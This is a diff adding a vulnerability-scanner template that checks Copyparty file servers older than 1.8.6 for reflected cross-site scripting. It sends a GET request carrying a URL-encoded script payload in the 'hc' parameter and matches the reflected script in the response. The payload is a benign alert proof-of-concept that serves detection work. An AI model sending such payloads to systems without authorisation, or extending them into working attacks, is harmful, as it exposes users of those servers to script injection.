@@ -1,0 +1,27 @@
+id: copyparty-xss
+name: Copyparty v1.8.6 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting
+  (XSS) Attack. The vulnerability in the application's web interface could allow an attacker to execute malicious javascript
+  code by tricking users into accessing a malicious link.
+reference: https://github.com/9001/copyparty/security/advisories/GHSA-cw7j-v52w-fp5r
+tags:
+- copyparty
+- xss
+- vuln
+requests:
+- method: GET
+  path: /?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+  matchers:
+  - type: body
+    words:
+    - <a href="/"><script>alert(document.domain)</script>
+    - choose your OS
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
